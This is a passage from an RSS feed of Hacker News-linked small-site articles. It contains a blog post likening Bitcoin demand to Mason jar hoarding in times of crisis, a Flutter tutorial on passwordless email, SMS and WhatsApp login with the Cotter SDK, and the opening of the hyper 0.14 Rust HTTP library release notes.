	
		
		
			
			
				<div>
					<p><a data-update-url="" data-toggle="collapse" href="#collapse_id_content_swisstopo-internet_en_swisstopo_ogd_jcr_content_inpagenav_items_286_1584718316416_tabPar_accordion_copy_copy_1134512352_2" data-parent="#id_content_swisstopo-internet_en_swisstopo_ogd_jcr_content_inpagenav_items_286_1584718316416_tabPar_accordion_copy_copy_1134512352">What is the added value for swisstopo if the Federal Office provides its digital geodata free of charge?</a></p><div id="collapse_id_content_swisstopo-internet_en_swisstopo_ogd_jcr_content_inpagenav_items_286_1584718316416_tabPar_accordion_copy_copy_1134512352_2">
						
	
	
	<div>


<div>
    
	
	
	

    
    <div>
        
  …</div></div></div></div></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.swisstopo.admin.ch/en/swisstopo/free-geodata.html">https://www.swisstopo.admin.ch/en/swisstopo/free-geodata.html</a></em></p>]]>
            </description>
            <link>https://www.swisstopo.admin.ch/en/swisstopo/free-geodata.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25521405</guid>
            <pubDate>Wed, 23 Dec 2020 19:50:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mason Jars, Bitcoin and the Doomsday Industry]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25521378">thread link</a>) | @wiggumspiggums
<br/>
December 23, 2020 | https://prudentlycrypto.com/mason-jars-bitcoin-the-doomsday-industry/ | <a href="https://web.archive.org/web/*/https://prudentlycrypto.com/mason-jars-bitcoin-the-doomsday-industry/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
												
<p>You might think that Mason jars are simply a staple of hipster home goods. But it turns out that demand for Mason jars — their lids, to be exact — are a remarkably accurate indicator of economic uncertainty. According to journalist Jen Doll who penned “<a href="https://marker.medium.com/why-everyones-suddenly-hoarding-mason-jars-4fe8cc1e098f" target="_blank" rel="noreferrer noopener">Why Everyone’s Suddenly Hoarding Mason Jars</a>“:</p>



<blockquote><p>The runs on Mason jars tend to occur when there is some kind of economic instability, recessions, in wartime, basically, anytime that people start to freak out about where they’re going to get their food, if they’re going to have enough food, what is happening in the world.”</p><cite>Interview on <a href="https://www.marketplace.org/2020/12/07/why-demand-for-mason-jars-surges-in-times-of-uncertainty/" target="_blank" rel="noreferrer noopener">Marketplace</a></cite></blockquote>



<p>Mason jar historians (yes, that’s a thing) have been able to correlate spikes in Mason jar sales to: the Great Depression &amp; World War II, the back-to-the-land movement of the 1970s &amp; 80s, Y2K, the 2009 Recession and now 2020. Like squirrels hiding their nuts for the winter, people have jarred what they can in preparation for the end times, once again. </p>



<p>Doll’s story got us thinking about other products that thrive when apocalypse is in the air. Toilet paper, bottled water, canned goods, guns, gold… and that led us to wonder: </p>



<p><strong>Is Bitcoin a product of the doomsday industry?</strong></p>



<h2>Born out of chaos</h2>



<div><figure><img loading="lazy" src="https://i1.wp.com/prudentlycrypto.com/wp-content/uploads/2020/12/the-next-x-men-apocalypse-gone-rogue-113217.jpg?resize=452%2C340&amp;ssl=1" alt="" width="452" height="340" srcset="https://i1.wp.com/prudentlycrypto.com/wp-content/uploads/2020/12/the-next-x-men-apocalypse-gone-rogue-113217.jpg?w=500&amp;ssl=1 500w, https://i1.wp.com/prudentlycrypto.com/wp-content/uploads/2020/12/the-next-x-men-apocalypse-gone-rogue-113217.jpg?resize=300%2C226&amp;ssl=1 300w" sizes="(max-width: 452px) 100vw, 452px" data-recalc-dims="1"></figure></div>



<p>For starters, Bitcoin was born right after the markets collapsed in 2008. The creator of Bitcoin even <a href="https://en.bitcoin.it/wiki/Genesis_block">referenced a news article</a> about a second round of bailouts in the UK in the initial block of transactions recorded to the Bitcoin blockchain. Some viewed Bitcoin as both a solution to and a rebuke of the current financial system.</p>



<p>Now, we aren’t here to debate if the central banks did the right thing. But the bailouts rubbed many people the wrong way. You had powerful government officials helping the financial elite, i.e. their buddies at the country club. A lot of Wall Street typically lobbies against social programs that help lower income groups, yet here they were accepting handouts from the government. And there was the “moral hazard” of not allowing the invisible hand of the markets to do its work — penalize risky lenders and borrowers — and allow these actors to self-correct rather than be saved. </p>



<p>The financial crisis also brought to light aspects of the modern financial system that disturbed many people. Specifically:</p>



<ul><li>Too Big to Fail – The financial system hinging on a select group of massive banks. Many believe you couldn’t let the banks fail even if they deserved to, otherwise everyone would get screwed.</li><li>Fractional Reserve &amp; Interbank Lending – Banks lending out far more money than they had in reserves (fractional reserves) and lending to each other (interbank lending). Banks are so interconnected that if one can’t make good on returning money to its lenders, all banks can be in trouble. </li><li>Modern Monetary Theory – Government central banks “printing money” to keep the retail banks afloat. They did this by buying the bad debt from the retail banks at way-above-market-prices. This allowed retail banks to put cash in their reserves and stay afloat.</li></ul>



<p>(<a href="https://www.khanacademy.org/economics-finance-domain/macroeconomics/macroeconomics-income-inequality/the-2008-financial-crisis/v/bailout-1-liquidity-vs-solvency" target="_blank" rel="noreferrer noopener">Kahn Academy</a> does an awesome job of breaking down the 2008 financial crisis if you want an easy-to-understand, in-depth look).</p>



<p>In the context of that time period, Bitcoin had a lot of appeal:</p>



<ul><li>No need for intermediaries, i.e. banks. Bitcoin allows you to transact with and store your coins on your own.</li><li>More fairness. Because Bitcoin is code, it doesn’t have any human biases deciding who gets a bailout and who doesn’t. In fact, there is no mechanism for bailouts. Everyone needs to be self-sufficient.</li><li>No single point of failure. Bitcoin is a decentralized protocol. No single party (or select few) can bring it all to a halt if they screw up.</li><li>What you see is what you get. The blockchain lets you see the coins you have access to. It’s not a representation of what you are owed, which is what you see when you log into your online account at Chase or Bank of America. It’s actually there.</li><li>No arbitrary money printing. Hard-coded into the Bitcoin protocol is a limit on the total supply of Bitcoin. There will never be more than 21 million coins unless 51% of all miners vote otherwise, and that is highly unlikely.</li></ul>



<p>In other words, Bitcoin was born out of chaos.</p>



<h2>2020</h2>



<figure><img loading="lazy" width="665" height="249" src="https://i2.wp.com/prudentlycrypto.com/wp-content/uploads/2020/12/twitter-2020.jpg?resize=665%2C249&amp;ssl=1" alt="" srcset="https://i2.wp.com/prudentlycrypto.com/wp-content/uploads/2020/12/twitter-2020.jpg?w=814&amp;ssl=1 814w, https://i2.wp.com/prudentlycrypto.com/wp-content/uploads/2020/12/twitter-2020.jpg?resize=300%2C112&amp;ssl=1 300w, https://i2.wp.com/prudentlycrypto.com/wp-content/uploads/2020/12/twitter-2020.jpg?resize=768%2C288&amp;ssl=1 768w, https://i2.wp.com/prudentlycrypto.com/wp-content/uploads/2020/12/twitter-2020.jpg?resize=660%2C247&amp;ssl=1 660w" sizes="(max-width: 665px) 100vw, 665px" data-recalc-dims="1"></figure>



<p>Fast-forward to 2020 — global pandemic, massive unemployment, political polarization, violent protests, <em>etcetera</em>.</p>



<p>And the price of Bitcoin just cracked its all-time high.</p>



<figure><img loading="lazy" width="665" height="388" src="https://i0.wp.com/prudentlycrypto.com/wp-content/uploads/2020/12/image-3.png?resize=665%2C388&amp;ssl=1" alt="" srcset="https://i0.wp.com/prudentlycrypto.com/wp-content/uploads/2020/12/image-3.png?resize=1024%2C598&amp;ssl=1 1024w, https://i0.wp.com/prudentlycrypto.com/wp-content/uploads/2020/12/image-3.png?resize=300%2C175&amp;ssl=1 300w, https://i0.wp.com/prudentlycrypto.com/wp-content/uploads/2020/12/image-3.png?resize=768%2C449&amp;ssl=1 768w, https://i0.wp.com/prudentlycrypto.com/wp-content/uploads/2020/12/image-3.png?resize=660%2C385&amp;ssl=1 660w, https://i0.wp.com/prudentlycrypto.com/wp-content/uploads/2020/12/image-3.png?w=1303&amp;ssl=1 1303w" sizes="(max-width: 665px) 100vw, 665px" data-recalc-dims="1"></figure>



<p>Back in the early years of Bitcoin, there was a narrative that Bitcoin was digital money. But that’s lost momentum for a variety of reasons: its price has been too volatile, government regulation, transaction fees have been too high which makes smaller transactions impractical, consumer user experience has been lacking, etc. </p>



<p>Since then, the narrative has evolved to focus on Bitcoin’s abilities as a store of value. Like gold, <a href="https://prudentlycrypto.com/why-bitcoin-is-called-digital-gold-and-why-store-of-value-is-a-bullshit-argument/" target="_blank" rel="noreferrer noopener">Bitcoin is a hedge against inflation</a>. </p>



<p>During these “unprecedented times” of 2020, Bitcoin proponents point to record low interest rates and the massive money printing done by governments to stimulate/ prop up economies. They tout that Bitcoin will become THE way to preserve wealth. And people are buying it (both the story being told and Bitcoin itself).</p>



<p>In this narrative, it feels like Bitcoin’s ultimate success — to be the end-all-be-all store of value — depends on the complete and utter failure of our current monetary system. Ya know, doomsday.</p>



<h2>Trust issues</h2>



<div><figure><img loading="lazy" width="531" height="403" src="https://i1.wp.com/prudentlycrypto.com/wp-content/uploads/2020/12/344082-Two-Reasons-I-Don-t-Trust-People.jpg?resize=531%2C403&amp;ssl=1" alt="" srcset="https://i1.wp.com/prudentlycrypto.com/wp-content/uploads/2020/12/344082-Two-Reasons-I-Don-t-Trust-People.jpg?w=531&amp;ssl=1 531w, https://i1.wp.com/prudentlycrypto.com/wp-content/uploads/2020/12/344082-Two-Reasons-I-Don-t-Trust-People.jpg?resize=300%2C228&amp;ssl=1 300w" sizes="(max-width: 531px) 100vw, 531px" data-recalc-dims="1"></figure></div>



<p>Why people hoard Mason jars during times of economic uncertainty is not clear. Sure, some people are doing it to cut costs. But in interviewing historians, Doll found that people may be subconsciously motivated by a desire for control:</p>



<blockquote><p>When there are these big downfalls of trust in systems of government or economy or institutions, there’s this desire to retain control wherever we can find it… Growing your own garden or canning your own food offers a sense of transparency, even if it’s an illusion. You don’t just have to trust in the system.&nbsp; </p><cite>Anna Zeide, PhD, author of&nbsp;<em>Canned: The Rise and Fall of Consumer Confidence in the American Food Industry</em></cite></blockquote>



<p>Hmmmm, is it just us, or could Zeide talking about crypto? </p>



<p>If you’ve read about crypto or listened to podcasts, you’ll know that “trust”, “trustless” and “trustlessness” are basically crypto bingo words. There are even diehards in the crypto community who say “not your keys, not your coins” because they don’t trust custodial services to manage their cryptocurrency. They want sole control, even though <a href="https://prudentlycrypto.com/not-your-keys-not-your-coins-wallet-vs-exchange/" target="_blank" rel="noreferrer noopener">self-custodying can be just as risky</a>, if not more.</p>



<p>Let’s modify what Zeide said: “When there are these big downfalls of trust in systems of government or economy or institutions, there’s this desire to retain control wherever we can find it… <strong>Keeping your money in crypto</strong> offers a sense of transparency, even if it’s an illusion. You don’t just have to trust in the system.”</p>



<p>It doesn’t seem like a coincidence that the psychology behind hoarding Mason jars feels strangely familiar to buying up Bitcoin. </p>



<h2>The Pinterest-Etsy-DIY-farm-chic-urban-boho-avocado-toast market</h2>



<p>As you may know, Mason jars experienced a renaissance in the 2010’s when it captured the mindshare of the Pinterest-Etsy-DIY-farm-chic-urban-boho-avocado-toast market (or PEDYFCUBAT, for short). 200+ years after its invention, Mason jars became in vogue independent of any major global crisis. Huzzah!</p>



<p>Bitcoin could find it’s version of the PEDYFCUBAT market, too (though ideally faster than a couple hundred years). Personally speaking, we think Bitcoin hasn’t reached market saturation yet. And its price will eventually end up coming to a kind of steady-state, which it will then fluctuate around. (This is <a href="https://prudentlycrypto.com/is-cryptocurrency-a-good-investment" target="_blank" rel="noreferrer noopener">why we bet on Bitcoin</a>, in spite of all the hype).</p>



<h2>End of the beginning</h2>



<p>This week, the coronavirus vaccine is rolling out to healthcare workers and vulnerable populations, and the FDA continues to authorize more vaccines. While we’re not out of the woods economically speaking, this may be the beginning of the end. One cannot help but wonder: if the economy recovers and we’re “back to normal”, will Bitcoin’s bright star fade as well?</p>



<p>Until the end-of-the-world-as-we-know-it arrives, perhaps Bitcoin is not on an exponential trajectory upwards. Bitcoin demand might be more like the Mason jar’s — growing slowly, jumping and falling sharply along the way, in sync with seasons of economic instability.</p>
											</div></div>]]>
            </description>
            <link>https://prudentlycrypto.com/mason-jars-bitcoin-the-doomsday-industry/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25521378</guid>
            <pubDate>Wed, 23 Dec 2020 19:47:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Log Users in Using Email, SMS, or WhatsApp Login in Flutter]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25521325">thread link</a>) | @mmarcelline
<br/>
December 23, 2020 | https://blog.cotter.app/flutter-email-phone-auth-3-simple-steps-to-log-in-your-users-via-email-sms-and-whatsapp-using-cotter/ | <a href="https://web.archive.org/web/*/https://blog.cotter.app/flutter-email-phone-auth-3-simple-steps-to-log-in-your-users-via-email-sms-and-whatsapp-using-cotter/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
<div>
<article>

<figure>
<img srcset="https://blog.cotter.app/content/images/size/w300/2020/06/FlutterEmailPhoneAuth-1.png 300w,
                            https://blog.cotter.app/content/images/size/w600/2020/06/FlutterEmailPhoneAuth-1.png 600w,
                            https://blog.cotter.app/content/images/size/w1000/2020/06/FlutterEmailPhoneAuth-1.png 1000w,
                            https://blog.cotter.app/content/images/size/w2000/2020/06/FlutterEmailPhoneAuth-1.png 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://blog.cotter.app/content/images/size/w2000/2020/06/FlutterEmailPhoneAuth-1.png" alt="Flutter Email &amp; Phone Auth: 3 Simple Steps To Log Your Users In via Email, SMS, and WhatsApp using Cotter">
</figure>
<section>
<div>
<p>When building an app, it's often a requirement to make sure your users are real and you want to know if they own the email or phone number that they signed up with so you can communicate via those channels.</p><p>In this tutorial, we'll build a flutter app that allows users to <strong>sign up and sign in with their email or phone number</strong>.</p><h3 id="in-this-post-">In this post:</h3><ul><li><a href="#create-a-flutter-app">Create a Flutter App</a></li><li><a href="#sign-in-with-email">Sign in with Email</a></li><li><a href="#sign-in-with-phone-number">Sign in with Phone Number via SMS or WhatsApp</a></li><li><a href="#that-s-it">See the result: Sign in with Phone Number</a></li></ul><p>If this is your first time making a Flutter app, check out their <a href="https://flutter.dev/docs/get-started/install">installation guide.</a> To create a new flutter app, run:<br></p><pre><code>flutter create flutter_passwordless
cd flutter_passwordless

// Run your app
flutter run</code></pre><h3 id="make-a-welcome-page">Make a Welcome Page</h3><p>We'll edit <code>lib/main.dart</code> to make our welcome page. Replace the contents with the following code:</p><h2 id="sign-up-new-users-or-login-existing-users">Sign Up New Users or Login Existing Users</h2><p>Notice that we only have a "Sign in" button. We've combined the sign up and login functionality. After verifying the user's email:</p><ul><li><strong>If it's a new user</strong>, the SDK will automatically create a new user in Cotter, and return the new user to you.</li><li><strong>If it's a user that already exists</strong> in Cotter, the SDK will return the existing user information.</li></ul><h3 id="step-1-add-cotter-to-your-project">Step 1: Add Cotter to your project</h3><p>Add Cotter to your <code>pubspec.yaml</code> , then run <code>flutter pub get</code>.</p><figure><pre><code>dependencies:
  cotter:</code></pre><figcaption>pubspec.yaml</figcaption></figure><p>Check the latest releases in <a href="https://pub.dev/packages/cotter#-installing-tab-">pub.dev</a>. </p><blockquote>You may need to restart your flutter for it to run pod install (stop <code>flutter run</code> and re-run it).</blockquote><h3 id="initialize-cotter">Initialize Cotter</h3><p>Import Cotter in your <code>lib/main.dart</code>, then initialize it inside <code>HomePageState</code>.</p><pre data-line="1, 6-7"><code>import 'package:cotter/cotter.dart'; // Import Cotter

class HomePageState extends State<homepage> {
  ...

  // 1️⃣ Initialize Cotter
  Cotter cotter = new Cotter(apiKeyID: API_KEY_ID); // 👈 Specify your API KEY ID here

  // 2️⃣ TODO: Make Sign Up &amp; Login Function
  
  _showResponse(BuildContext context, String title, String content) {...}
  
  @override
  Widget build(BuildContext context) { ... }
}</homepage></code>
</pre>
<figcaption>lib/main.dart</figcaption><p>You can <a href="https://dev.cotter.app/">create a free account at Cotter</a> to get your <code>API_KEY_ID</code>.</p><h3 id="step-2-setup-deep-linking">Step 2: Setup Deep-Linking</h3><p>To sign in using email verification, we will open a secure in-app browser where the user can enter the OTP sent to their email. We'll need to set a redirect URL that points to your app to tell the in-app browser what to do after it's finished authenticating. Let's set the redirect URL as <code>myexample://auth_callback</code>.</p><p><strong>Setup in iOS</strong></p><p>Add the following to your <code>ios/Runner/Info.plist</code>.</p><figure><pre><code>&lt;key&gt;CFBundleURLTypes&lt;/key&gt;
&lt;array&gt;
  &lt;dict&gt;
    &lt;key&gt;CFBundleTypeRole&lt;/key&gt;
    &lt;string&gt;Editor&lt;/string&gt;
    &lt;key&gt;CFBundleURLName&lt;/key&gt;
    &lt;string&gt;myexample&lt;/string&gt; &lt;!-- 👈 Setting scheme to myexample:// --&gt;
    &lt;key&gt;CFBundleURLSchemes&lt;/key&gt;
    &lt;array&gt;
      &lt;string&gt;myexample&lt;/string&gt; &lt;!-- 👈 Setting scheme to myexample://  --&gt;
    &lt;/array&gt;
  &lt;/dict&gt;
&lt;/array&gt;</code></pre><figcaption>ios/Runner/Info.plist</figcaption></figure><p><strong>Setup in Android</strong></p><p>Add the following to your <code>android/app/src/main/AndroidManifest.xml</code>.</p><figure><pre><code>&lt;manifest ...&gt;
    &lt;application ...&gt; 
    ...

    &lt;!-- Add the lines from here --&gt;
    &lt;activity android:name="com.linusu.flutter_web_auth.CallbackActivity" &gt;
      &lt;intent-filter android:label="flutter_web_auth"&gt;
        &lt;action android:name="android.intent.action.VIEW" /&gt;
        &lt;category android:name="android.intent.category.DEFAULT" /&gt;
        &lt;category android:name="android.intent.category.BROWSABLE" /&gt;
        &lt;!-- 👇 This is for myexample://auth_callback --&gt;
        &lt;data android:scheme="myexample" android:host="auth_callback"/&gt;
      &lt;/intent-filter&gt;
    &lt;/activity&gt;
    &lt;!-- Until here --&gt;

  &lt;/application&gt;
&lt;/manifest&gt;</code></pre><figcaption>android/app/src/main/AndroidManifest.xml</figcaption></figure><blockquote>Now stop <code>flutter run</code> and re-run it.</blockquote><h3 id="step-3-make-a-sign-up-login-function">Step 3: Make a Sign Up/Login Function</h3><p>To sign in using email verification, call <code>cotter.signInWithEmailOTP</code>. </p><figure><pre><code>// 2️⃣  Make Sign Up &amp; Login Function
  void signUpOrLogin(BuildContext context) async {
    try {
      // 🚀 Verify email, then create new user or login
      var user = await cotter.signInWithEmailOTP(
        redirectURL: "myexample://auth_callback",
        email: inputController.text,
      );

      // Show the response
      _showResponse(context, "User Created",
          "id: ${user.id}\nidentifier: ${user.identifier}");
      print(user);
    } catch (e) {
      _showResponse(context, "Error", e.toString());
    }
  }</code></pre><figcaption>lib/main.dart</figcaption></figure><h3 id="call-the-function-from-our-button">Call the function from our button</h3><figure><pre><code>class HomePageState extends State&lt;HomePage&gt; {
  @override
  Widget build(BuildContext context) {
		  ...
              // Sign In Button
              MaterialButton(
                onPressed: () {
+                  signUpOrLogin(context);
                },
                color: Colors.deepPurpleAccent,
                textColor: Colors.white,
                child: Text("Sign in With Email"),
              ),
          ...
  }
}
</code></pre><figcaption>lib/main.dart</figcaption></figure><h2 id="that-s-it-for-email-login">That's It for Email Login</h2><p>Now you should be able to sign up and log in with email.</p><figure><img src="https://blog.cotter.app/content/images/2020/06/FlutterEmailLogin.gif"><figcaption>Log in with Email using Cotter's Flutter SDK</figcaption></figure><p>Let's add another page to try signing up with a phone number. Make a new file called <code>phoneSignIn.dart</code> inside the <code>lib</code> folder:</p><pre><code>touch lib/phoneSignIn.dart</code></pre><p>Then, copy the code below:</p><figure><pre><code>import 'package:flutter/material.dart';

void main() {
  runApp(PhoneSignInPage());
}

class PhoneSignInPage extends StatefulWidget {
  @override
  PhoneSignInPageState createState() =&gt; PhoneSignInPageState();
}

// Our Home Page
class PhoneSignInPageState extends State&lt;PhoneSignInPage&gt; {
  final inputController = TextEditingController();

  // 1️⃣ TODO: Initialize Cotter
  // 2️⃣ TODO: Make Sign Up &amp; Login Function

  // This is a helper function that shows the response
  // from our Sign Up and Login functions.
  _showResponse(BuildContext context, String title, String content) {
    showDialog(
      context: context,
      builder: (context) =&gt; AlertDialog(
        title: Text(title),
        content: Text(content),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Container(
        padding: EdgeInsets.all(20),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text("Sign in with Phone Number.",
                style: TextStyle(fontWeight: FontWeight.bold, fontSize: 20)),
            Text("Open pre-built phone input form.",
                style: TextStyle(color: Colors.grey)),

            // Button to open a pre-built phone input form
            Container(
              margin: EdgeInsets.symmetric(vertical: 30),
              child: MaterialButton(
                onPressed: () {},
                color: Colors.deepPurpleAccent,
                textColor: Colors.white,
                child: Text("Sign In with Phone"),
              ),
            ),
          ],
        ),
      ),
    );
  }
}
</code></pre><figcaption>lib/phoneSignIn.dart</figcaption></figure><h3 id="go-to-phone-sign-in-page-from-the-home-page">Go to Phone Sign In Page from the Home Page</h3><p>Let's make a button in our home page to go to this new <code>PhoneSignInPage</code>. Add a button in <code>lib/main.dart</code>.</p><pre data-line="1, 15-26"><code>import 'package:flutter_passwordless/phoneSignIn.dart';

class HomePageState extends State<homepage> {
  @override
  Widget build(BuildContext context) {
    ...
        // Sign In Button
        MaterialButton(
          onPressed: () { signUpOrLogin(context); },
          color: Colors.deepPurpleAccent,
          textColor: Colors.white,
          child: Text("Sign In With Email"),
        ),

        // Button to go to Phone sign in
        OutlineButton(
          onPressed: () {
            Navigator.push(
              context,
              MaterialPageRoute(builder: (context) =&gt; PhoneSignInPage()),
            );
          },
          color: Colors.deepPurpleAccent,
          textColor: Colors.deepPurpleAccent,
          child: Text("Go to Phone Sign In \u2192"),
        ),
    ...
  }
}
</homepage></code>
</pre>
<figcaption>lib/main.dart</figcaption><h3 id="initialize-cotter-1">Initialize Cotter</h3><p>Just like before, import Cotter in your <code>lib/phoneSignIn.dart</code>, then initialize it inside <code>HomePageState</code>.</p><pre data-line="1, 6-7"><code>import 'package:cotter/cotter.dart'; // Import Cotter

class PhoneSignInPageState extends State<phonesigninpage> {
  ...

  // 1️⃣ Initialize Cotter
  Cotter cotter = new Cotter(apiKeyID: API_KEY_ID); // 👈 Specify your API KEY ID here
  // 2️⃣ TODO: Make Sign Up &amp; Login Function

  _showResponse(BuildContext context, String title, String content) {...}

  @override
  Widget build(BuildContext context) {...}</phonesigninpage></code>
</pre>
<figcaption>lib/phoneSignIn.dart</figcaption><p>Open your <a href="https://dev.cotter.app/">dashboard</a> to get your <code>API_KEY_ID</code>. To send SMS or WhatsApp messages, you need to add a balance to your account.</p><h3 id="make-a-sign-up-login-function">Make a Sign Up/Login Function</h3><p>To sign in using phone verification, call <code>cotter.signInWithPhoneOTP</code>. This will open a pre-built phone number input inside the in-app browser. <a href="https://docs.cotter.app/sdk-reference/flutter/sign-in-with-email-phone-number#step-4-logging-in">You can also use your own input form if you want</a>.</p><figure><pre><code>  // 2️⃣ Make Sign Up &amp; Login Function
  void signUpOrLogin(BuildContext context) async {
    try {
      // 🚀 Verify phone number, then create new user or login
      var user = await cotter.signInWithPhoneOTP(
        redirectURL: "myexample://auth_callback",
        channels: [PhoneChannel.SMS, PhoneChannel.WHATSAPP], // show SMS and WhatsApp options
      );

      // Show the response
      _showResponse(context, "Sign In Success",
          "User id: ${user.id}\nidentifier: ${user.identifier}");
      print(user);
    } catch (e) {
      _showResponse(context, "Error", e.toString());
    }
  }</code></pre><figcaption>lib/phoneSignIn.dart</figcaption></figure><h3 id="call-the-function-from-our-button-1">Call the function from our button</h3><figure><pre><code>class PhoneSignInPageState extends State&lt;PhoneSignInPage&gt; {
  @override
  Widget build(BuildContext context) {
  		...
            // Button to open a pre-built phone input form
            Container(
              margin: EdgeInsets.symmetric(vertical: 30),
              child: MaterialButton(
                onPressed: () {
+                  signUpOrLogin(context);
                },
                color: Colors.deepPurpleAccent,
                textColor: Colors.white,
                child: Text("Sign In with Phone"),
              ),
            ),
        ...
  }
}</code></pre><figcaption>lib/phoneSignIn.dart</figcaption></figure><p>Now you should be able to login using your phone number via SMS or WhatsApp.</p><figure><img src="https://blog.cotter.app/content/images/2020/06/FlutterPhoneLogin-1.gif"><figcaption>Phone Login via SMS or WhatsApp using Cotter's Flutter SDK</figcaption></figure><p>The <code>signUp</code> and <code>login</code> functions that …</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.cotter.app/flutter-email-phone-auth-3-simple-steps-to-log-in-your-users-via-email-sms-and-whatsapp-using-cotter/">https://blog.cotter.app/flutter-email-phone-auth-3-simple-steps-to-log-in-your-users-via-email-sms-and-whatsapp-using-cotter/</a></em></p>]]>
            </description>
            <link>https://blog.cotter.app/flutter-email-phone-auth-3-simple-steps-to-log-in-your-users-via-email-sms-and-whatsapp-using-cotter/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25521325</guid>
            <pubDate>Wed, 23 Dec 2020 19:43:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hyper 0.14: A safe, reliable, fast HTTP library written in Rust]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25521217">thread link</a>) | @ibraheemdev
<br/>
December 23, 2020 | https://seanmonstar.com/post/638320652536922112/hyper-v014 | <a href="https://web.archive.org/web/*/https://seanmonstar.com/post/638320652536922112/hyper-v014">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                
                <p>hyper v0.14
I’m so thrilled to announce the release of <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fgithub.com%2Fhyperium%2Fhyper%2Freleases%2Ftag%2Fv0.14.0&amp;t=YjRjYTVkZjYxYjMwMTQ3NTdlYjU5MTcwMWMzYWMxYTNmZGNlMGExZixVbDhCczJ6Vw%3D%3D&amp;b=t%3AN6mvDp1g04CUwpyFLi522Q&amp;p=https%3A%2F%2Fseanmonstar.com%2Fpost%2F638320652536922112%2Fhyper-v014&amp;m=0&amp;ts=1608915759">hyper v0.14</a> today. <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fhyper.rs&amp;t=M2Y1ZWJiNTJhODhmMzMxNDIzMTNkZWIzYmUyNjFmOTE5OTRlNGJmOCxVbDhCczJ6Vw%3D%3D&amp;b=t%3AN6mvDp1g04CUwpyFLi522Q&amp;p=https%3A%2F%2Fseanmonstar.com%2Fpost%2F638320652536922112%2Fhyper-v014&amp;m=0&amp;ts=1608915759">hyper</a> is a safe, reliable, fast HTTP library written in Rust. It provides asynchronous client and server APIs, supporting both HTTP/1 and HTTP/2.</p><h3>What’s this release all about?</h3><h4>Tokio 1.0</h4><p>Today also sees the release of <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Ftokio.rs%2Fblog%2F2020-12-tokio-1-0&amp;t=MmMyNzBhZGViMWU3OTFhYmE0M2NlZjUyMzYxMjJiYjU4MjU5N2NmOSxVbDhCczJ6Vw%3D%3D&amp;b=t%3AN6mvDp1g04CUwpyFLi522Q&amp;p=https%3A%2F%2Fseanmonstar.com%2Fpost%2F638320652536922112%2Fhyper-v014&amp;m=0&amp;ts=1608915759">Tokio v1.0</a>. We wanted to ensure that with that momentous release, hyper was ready immediately so the ecosystem can start using it right away. This change doesn’t have much of an outward effect on hyper’s API, but is a big step towards stabilizing the Rust networking experience.</p><h4>Optional Main Features</h4><p>hyper has had optional features for a while, such as optional support for the Tokio. This allows convenient usage with the excellent Tokio runtime, while allowing others who have an existing runtime to just use hyper for its HTTP bits.</p><p>In this release, however, we’ve made the main pieces of hyper optional features.</p><ul><li><code>http1</code></li><li><code>http2</code></li><li><code>client</code></li><li><code>server</code></li></ul><p>These features cover the largest parts of hyper, its protocol implementations. With these now able to be enabled or disabled, you can significantly reduce the amount of code you compile and include in hyper. For example, if you’re application always talks to an HTTP/1 server, you can enable just the <code>http1</code> and <code>client</code> features. Or <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fgithub.com%2Fhyperium%2Ftonic&amp;t=Yjg5MmYzOTYzYzYyMjAzMjdlYzA2MTYxNzg1NzBmM2E3NzdlYWIzZixVbDhCczJ6Vw%3D%3D&amp;b=t%3AN6mvDp1g04CUwpyFLi522Q&amp;p=https%3A%2F%2Fseanmonstar.com%2Fpost%2F638320652536922112%2Fhyper-v014&amp;m=0&amp;ts=1608915759">Tonic</a>, a Rust gRPC library, since it is based on HTTP/2, it can disable the HTTP/1 code in hyper, enabling only <code>http2</code>, <code>client</code>, and <code>server</code>.</p><h3>What’s next?</h3><p>This release is timed to go out with <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Ftokio.rs%2Fblog%2F2020-12-tokio-1-0&amp;t=MmMyNzBhZGViMWU3OTFhYmE0M2NlZjUyMzYxMjJiYjU4MjU5N2NmOSxVbDhCczJ6Vw%3D%3D&amp;b=t%3AN6mvDp1g04CUwpyFLi522Q&amp;p=https%3A%2F%2Fseanmonstar.com%2Fpost%2F638320652536922112%2Fhyper-v014&amp;m=0&amp;ts=1608915759">Tokio v1.0</a>, and notably isn’t hyper 1.0 yet. That means we’re not done. Here’s what we have planned coming soon:</p><h4>Stability</h4><p>We have our eyes set on making hyper stable, with a 1.0 release. We know many people rely on hyper to make fast, reliable HTTP applications and libraries, and it’s a top priority to make hyper stable and no longer need breaking changes.</p><p>Stability is also meant in terms of reliability: we’ll continue to fix bugs, improve performance, and undertake internal refactors that shouldn’t affect the API, but will result in more and more reliable HTTP for users.</p><h4>Simplification</h4><p>As part of the drive to stabilization and 1.0, we will be making strides towards simplifying the public API exposed in hyper. Simplifying things can mean different things, so for hyper, it refers to removing the more opinionated pieces. That means aiming to embrace the “low level” aspect of hyper, and moving more “high level” pieces into other libraries.</p><h4>C API</h4><p>Stabilizing and simplifying doesn’t mean nothing new is coming. New things are being worked on <em>right now</em>, but with great care to not disrupt the stabilization 